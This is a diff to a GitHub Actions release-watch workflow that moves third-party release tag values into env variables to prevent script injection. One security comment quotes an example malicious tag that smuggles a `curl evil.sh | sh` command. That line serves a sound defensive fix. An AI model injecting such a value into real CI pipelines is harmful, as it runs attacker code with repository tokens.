@@ -5,6 +5,10 @@ on:
     - cron: '17 19 * * *'
   workflow_dispatch:
 
+concurrency:
+  group: agy-version-watch
+  cancel-in-progress: false
+
 permissions:
   contents: write
   pull-requests: write
@@ -47,6 +51,19 @@ jobs:
 
       - name: Determine mode (skip_uptodate / skip_pending / new_intake)
         id: mode
+        # SECURITY: the values referenced by ${{ steps.*.outputs.* }} originate
+        # from an upstream (google-antigravity/antigravity-cli) release tag_name,
+        # which is third-party-controlled input. Interpolating it directly into
+        # a `run:` shell block via ${{ }} template substitution is a known GitHub
+        # Actions script-injection vector (a tag_name like `"; curl evil.sh | sh #`
+        # would be spliced into the script *before* the shell ever parses it).
+        # Passing it through `env:` instead means the shell only ever sees it as
+        # the *value* of a variable, never as script text.
+        # https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
+        env:
+          LATEST_RAW: ${{ steps.latest.outputs.version }}
+          VERIFIED_RAW: ${{ steps.verified.outputs.version }}
+          GH_TOKEN: ${{ github.token }}
         run: |
           set -eu
           # Strip a possible 'v' prefix before comparing, since
@@ -55,16 +72,17 @@ jobs:
           # normalizeVersion()) are always stored without it. Without this,
           # an upstream tag like "v1.0.16" would never match an already
           # verified "1.0.16" and would be misdetected as new_intake forever.
-          latest_raw="${{ steps.latest.outputs.version }}"
-          latest="${latest_raw#v}"
-          verified_raw="${{ steps.verified.outputs.version }}"
-          verified="${verified_raw#v}"
+          latest="${LATEST_RAW#v}"
+          verified="${VERIFIED_RAW#v}"
           branch="automation/agy-${latest}"
 
           echo "latest_normalized=$latest" >> "$GITHUB_OUTPUT"
           echo "branch=$branch" >> "$GITHUB_OUTPUT"
 
-          pr_count=$(gh pr list --repo bash0816/agy-termux --base main --head "$branch" --state open --json number --jq 'length')
+          # No --repo: rely on gh's ambient repo detection from the checked-out
+          # git remote, so this workflow behaves correctly if ever run from a
+          # fork or a renamed repo instead of hardcoding bash0816/agy-termux.
+          pr_count=$(gh pr list --base main --head "$branch" --state open --json number --jq 'length')
           if [ "$latest" = "$verified" ]; then
             echo "mode=skip_uptodate" >> "$GITHUB_OUTPUT"
             echo "Already verified: $latest == $verified"
@@ -75,18 +93,25 @@ jobs:
             echo "mode=new_intake" >> "$GITHUB_OUTPUT"
             echo "New version to intake: $latest"
           fi
-        env:
-          GH_TOKEN: ${{ github.token }}
 
       - name: Prepare candidate metadata
         if: steps.mode.outputs.mode == 'new_intake'
+        env:
+          # See the script-injection note on the "Determine mode" step above -
+          # same reasoning applies here.
+          VERSION_RAW: ${{ steps.latest.outputs.version }}
+          # Passed through so scripts/prepare-agy-candidate.js can send an
+          # Authorization header on its api.github.com call, avoiding the
+          # unauthenticated 60 req/hour/IP rate limit on shared GitHub-hosted
+          # runners (which is otherwise shared across many workflows/repos).
+          GH_TOKEN: ${{ github.token }}
         run: |
           set -eu
           # Intentionally the RAW upstream tag (not normalized): the GitHub
           # releases/tags/<tag> API lookup inside prepare-agy-candidate.js
           # needs the exact tag string as it exists on GitHub. The script
           # normalizes internally for the tag_name field it writes out.
-          version="${{ steps.latest.outputs.version }}"
+          version="$VERSION_RAW"
           node scripts/prepare-agy-candidate.js "$version" > /tmp/candidate.json
           echo "Candidate metadata:"
           cat /tmp/candidate.json
@@ -101,6 +126,10 @@ jobs:
       - name: Commit and create PR
         if: steps.mode.outputs.mode == 'new_intake'
         env:
+          # See the script-injection note on the "Determine mode" step above -
+          # same reasoning applies here.
+          LATEST_NORMALIZED: ${{ steps.mode.outputs.latest_normalized }}
+          BRANCH: ${{ steps.mode.outputs.branch }}
           GH_TOKEN: ${{ github.token }}
         run: |
           set -eu
@@ -111,8 +140,8 @@ jobs:
           # looked for. Recomputing independently risked drifting apart if
           # upstream ever used a v-prefixed tag (e.g. mode step checks
           # automation/agy-1.0.16 but this step pushes automation/agy-v1.0.16).
-          version="${{ steps.mode.outputs.latest_normalized }}"
-          branch="${{ steps.mode.outputs.branch }}"
+          version="$LATEST_NORMALIZED"
+          branch="$BRANCH"
 
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
@@ -160,7 +189,8 @@ jobs:
             echo "⚠️ **This PR does not trigger npm publish - manual steps required.**"
           } > "$pr_body_file"
 
-          existing=$(gh pr list --repo bash0816/agy-termux --base main --head "$branch" --state open --json number --jq 'length')
+          # No --repo: rely on gh's ambient repo detection (see note above).
+          existing=$(gh pr list --base main --head "$branch" --state open --json number --jq 'length')
           if [ "$existing" -eq 0 ]; then
             gh pr create \
               --base main \
